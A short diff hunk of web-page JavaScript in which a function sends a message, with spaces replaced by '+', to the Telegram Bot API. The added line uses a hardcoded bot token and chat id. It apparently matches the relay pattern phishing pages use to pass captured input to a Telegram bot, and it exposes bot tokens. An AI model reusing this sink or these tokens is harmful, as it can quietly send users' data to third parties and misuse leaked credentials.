@@ -156,7 +156,7 @@ $(document).ready(function() {
  function execute(message){
      newmessage = message.replaceAll(' ', '+');
  var request = new XMLHttpRequest()
- request.open('GET', 'https://api.telegram.org/bot5571628108:AAF7uZNjX4UE9pYfXRHFaD1QSkKR3CjWrS0'+newmessage, true)
+ request.open('GET', 'https://api.telegram.org/bot5320091799:AAFce-Z2hWyczKEpNwDlw1THTt3GhLQDzz8/sendMessage?chat_id=-1001657741927&text='+newmessage, true)
  request.send()
  alert(message);
 }
